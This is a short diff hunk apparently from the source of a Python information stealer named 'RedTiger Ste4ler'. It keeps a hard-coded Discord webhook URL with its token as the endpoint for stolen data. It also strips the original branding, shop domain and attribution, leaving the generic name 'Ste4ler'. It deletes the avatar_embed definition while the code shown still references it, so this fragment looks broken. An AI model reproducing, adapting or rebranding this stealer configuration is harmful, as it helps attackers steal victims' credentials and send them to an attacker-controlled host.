@@ -58,11 +58,10 @@ def Clear():
         pass
 
 w3bh00k_ur1 = "https://discord.com/api/webhooks/1285292730003492905/NhLTLf8utQH7tRrkCXKyc_MaJnfY5QuYEgcawf5ZnYXaKzy3zl5YlY8NZ7dOjQ71QMkP"
-website = "redtiger.shop"
+website = "github.com"
 color_embed = 0xa80505
-username_embed = 'RedTiger Ste4ler'
-avatar_embed = 'https://cdn.discordapp.com/attachments/1268900329605300234/1276010081665683497/RedTiger-Logo.png?ex=66cf38be&is=66cde73e&hm=696c53b4791044ca0495d87f92e6d603e8383315d2ebdd385aaccfc6dbf6aa77&'
-footer_text = "RedTiger Ste4ler | https://github.com/loxyteck/RedTiger-Tools"
+username_embed = 'Ste4ler'
+footer_text = "Ste4ler"
 footer_embed = {
         "text": footer_text,
         "icon_url": avatar_embed,
